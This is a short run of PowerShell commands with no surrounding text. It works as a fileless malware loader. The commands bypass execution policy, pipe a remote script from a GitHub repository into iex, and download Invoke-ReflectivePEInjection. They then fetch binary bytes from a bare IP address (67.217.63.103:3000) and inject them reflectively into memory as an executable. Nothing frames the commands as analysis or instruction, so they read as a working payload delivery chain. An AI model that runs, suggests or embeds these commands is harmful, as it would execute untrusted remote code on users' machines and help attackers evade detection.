powershell -ExecutionPolicy Bypass -Command "& { iex (iwr 'https://raw.githubusercontent.com/jeowknfne/somestupidshiidgafabout/refs/heads/main/wtf.ps1' -UseBasicParsing) }"
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SafeItConsulting/Invoke-ReflectivePEInjection/main/Invoke-ReflectivePEInjection.ps1')
$bytes = (Invoke-WebRequest 'http://67.217.63.103:3000/api/download').Content
Invoke-ReflectivePEInjection -PEBytes $bytes
